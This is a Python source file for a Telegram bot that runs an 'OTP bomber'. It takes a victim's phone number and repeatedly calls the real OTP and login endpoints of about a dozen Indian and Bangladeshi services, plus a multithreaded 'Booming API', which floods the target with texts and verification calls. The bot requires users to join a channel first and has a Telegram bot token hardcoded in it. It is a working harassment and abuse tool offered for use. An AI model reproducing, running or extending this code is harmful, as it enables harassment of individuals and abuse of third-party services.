import logging
import asyncio
import requests
import time
import threading
import json
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters
)

BOT_TOKEN = "7714765260:AAG4yiN5_ow25-feUeKslR2xsdeMFuPllGg"
CHANNEL_ID = -1002512368825  # Replace with your channel ID

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Global variables
message_count = 0
api_counters = {}
status_message = None
bomber_active = False
start_time = 0
count_lock = threading.Lock()

# COMPLETE API CONFIGURATIONS (ALL 12 APIs INCLUDED)
api_configurations = [
    # POST APIs (40 second interval)
    {
        'name': 'Samsung OTP',
        'url': 'https://www.samsung.com/in/api/v1/sso/otp/init',
        'method': 'POST',
        'data': lambda n: json.dumps({"user_id": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'More Retail Login',
        'url': 'https://omni-api.moreretail.in/api/v1/login/',
        'method': 'POST',
        'data': lambda n: json.dumps({"hash_key": "XfsoCeXADQA", "phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Swiggy Call Verify',
        'url': 'https://profile.swiggy.com/api/v3/app/request_call_verification',
        'method': 'POST',
        'data': lambda n: json.dumps({"mobile": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'OLX Authentication',
        'url': 'https://www.olx.in/api/auth/authenticate?lang=en-IN',
        'method': 'POST',
        'data': lambda n: json.dumps({"method": "call", "phone": f"+91{n}", "language": "en-IN", "grantType": "retry"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'PropTiger Login',
        'url': 'https://www.proptiger.com/madrox/app/v2/entity/login-with-number-on-call',
        'method': 'POST',
        'data': lambda n: json.dumps({"contactNumber": n, "domainId": "2"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'ForexWin OTP',
        'url': 'https://api.forexwin.co/api/sendOtp',
        'method': 'POST',
        'data': lambda n: json.dumps({"phone": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'DocTime OTP',
        'url': 'https://admin.doctime.com.bd/api/otp/send',
        'method': 'POST',
        'data': lambda n: json.dumps({"contact": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Doubtnut Login',
        'url': 'https://api.doubtnut.com/v4/student/login',
        'method': 'POST',
        'data': lambda n: json.dumps({"is_web": "3", "phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Trinkerr OTP',
        'url': 'https://prod-backend.trinkerr.com/api/v1/web/traders/generateOtpForLogin',
        'method': 'POST',
        'data': lambda n: json.dumps({"mobile": n, "otpOperationType": "SignUp"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'Meesho OTP',
        'url': 'https://www.meesho.com/api/v1/user/login/request-otp',
        'method': 'POST',
        'data': lambda n: json.dumps({"phone_number": n}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    {
        'name': 'TLLMS OTP',
        'url': 'https://identity.tllms.com/api/request_otp',
        'method': 'POST',
        'data': lambda n: json.dumps({"feature": "", "phone": f"+91{n}", "type": "sms", "app_client_id": "null"}),
        'headers': {'Content-Type': 'application/json'},
        'interval': 40,
        'threads': 1
    },
    # GET APIs (45 second interval)
    {
        'name': 'Glonova Lookup',
        'url': 'https://glonova.in/',
        'method': 'GET',
        'params': lambda n: {'mobile': n},
        'interval': 45,
        'threads': 1
    },
    # Booming API (continuous)
    {
        'name': 'Booming API',
        'url': 'https://booming-api.vercel.app/',
        'method': 'GET',
        'params': lambda n: {'number': n},
        'interval': 0.5,
        'threads': 'user_defined'
    }
]

async def update_status(context: ContextTypes.DEFAULT_TYPE):
    global message_count, api_counters, status_message, bomber_active
    
    while bomber_active:
        with count_lock:
            current_total = message_count
            current_api_counts = api_counters.copy()
        
        runtime = time.time() - start_time
        status_text = f"🚀 BOMBER ACTIVE 🚀\n\n"
        status_text += f"⏱ Runtime: {int(runtime)}s\n"
        status_text += f"📊 Total Requests: {current_total}\n"
        status_text += f"⚡ Speed: {current_total/max(1,runtime):.1f} req/s\n\n"
        status_text += "🔹 Active APIs:\n"
        
        for api_name, count in current_api_counts.items():
            status_text += f"  • {api_name}: {count}\n"
        
        try:
            if status_message:
                await status_message.edit_text(status_text)
            await asyncio.sleep(5)
        except Exception as e:
            logging.error(f"Status update error: {e}")
            await asyncio.sleep(5)

def api_request_loop(api_config, number, context):
    global message_count, api_counters
    
    api_name = api_config['name']
    
    with count_lock:
        if api_name not in api_counters:
            api_counters[api_name] = 0
    
    while bomber_active:
        try:
            if api_config['method'] == 'POST':
                response = requests.post(
                    api_config['url'],
                    data=api_config['data'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            else:
                response = requests.get(
                    api_config['url'],
                    params=api_config['params'](number),
                    headers=api_config.get('headers', {}),
                    timeout=10
                )
            
            with count_lock:
                message_count += 1
                api_counters[api_name] += 1
                
        except Exception as e:
            logging.error(f"API {api_name} error: {e}")
        
        time.sleep(api_config['interval'])

async def start_bomber(number, boom_threads, update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bomber_active, start_time, message_count, api_counters, status_message
    
    bomber_active = True
    start_time = time.time()
    message_count = 0
    api_counters = {}
    
    # Create status message
    status_message = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text="🚀 Starting bomber..."
    )
    
    # Start status updater
    asyncio.create_task(update_status(context))
    
    # Start API threads
    for config in api_configurations:
        threads = boom_threads if config['threads'] == 'user_defined' else config['threads']
        for i in range(threads):
            t = threading.Thread(
                target=api_request_loop,
                args=(config, number, context),
                daemon=True
            )
            t.start()

async def stop_bomber(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bomber_active
    bomber_active = False
    await update.message.reply_text("🛑 Bomber stopped successfully!")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        keyboard = [
            [InlineKeyboardButton("Join Channel", url="https://t.me/+RhlQLyOfQ48xMjI1")],
            [InlineKeyboardButton("Check Join", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_photo(
            photo="https://t.me/bshshsubjsus/4",
            caption="Welcome! Please join the channel to continue.",
            reply_markup=reply_markup
        )
    except Exception as e:
        logging.error(f"Start error: {e}")
        await update.message.reply_text("An error occurred. Please try again.")

async def check_join(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = query.from_user.id

        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            keyboard = [[InlineKeyboardButton("🚀 Start Bomber", callback_data="start_bomber")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_caption(
                caption="✅ You have joined. Click to start bomber!",
                reply_markup=reply_markup
            )
        else:
            await query.edit_message_caption(caption="❌ Join the channel first!")
    except Exception as e:
        logging.error(f"Check_join error: {e}")
        await query.answer("Error checking join status", show_alert=True)

async def start_bomber_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        await query.edit_message_text(
            "Send target number (10 digits, no +91/0):"
        )
        
        context.user_data['awaiting_phone_number'] = True
    except Exception as e:
        logging.error(f"Start_bomber error: {e}")
        await query.answer("Error starting bomber", show_alert=True)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if 'awaiting_phone_number' in context.user_data and context.user_data['awaiting_phone_number']:
        phone_number = update.message.text
        
        if not phone_number.isdigit() or len(phone_number) != 10:
            await update.message.reply_text("Invalid number. Send 10 digits without +91/0.")
            return
        
        keyboard = [
            [InlineKeyboardButton("5", callback_data=f"threads_5_{phone_number}")],
            [InlineKeyboardButton("10", callback_data=f"threads_10_{phone_number}")],
            [InlineKeyboardButton("15", callback_data=f"threads_15_{phone_number}")],
            [InlineKeyboardButton("20", callback_data=f"threads_20_{phone_number}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "Select threads for Booming API (1-20 recommended):",
            reply_markup=reply_markup
        )
        
        context.user_data['awaiting_phone_number'] = False

async def handle_thread_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        
        data = query.data.split('_')
        threads = int(data[1])
        phone_number = data[2]
        
        await start_bomber(phone_number, threads, update, context)
        await query.edit_message_text(f"✅ Bomber started on {phone_number} with {threads} threads")
    except Exception as e:
        logging.error(f"Thread selection error: {e}")
        await query.answer("Error starting bomber", show_alert=True)

async def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Add handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stopbomber", stop_bomber))
    app.add_handler(CallbackQueryHandler(check_join, pattern="check_join"))
    app.add_handler(CallbackQueryHandler(start_bomber_handler, pattern="start_bomber"))
    app.add_handler(CallbackQueryHandler(handle_thread_selection, pattern="^threads_"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    logging.info("Bot is running...")
    await app.run_polling()

if __name__ == '__main__':
    import nest_asyncio
    nest_asyncio.apply()
    asyncio.run(main())
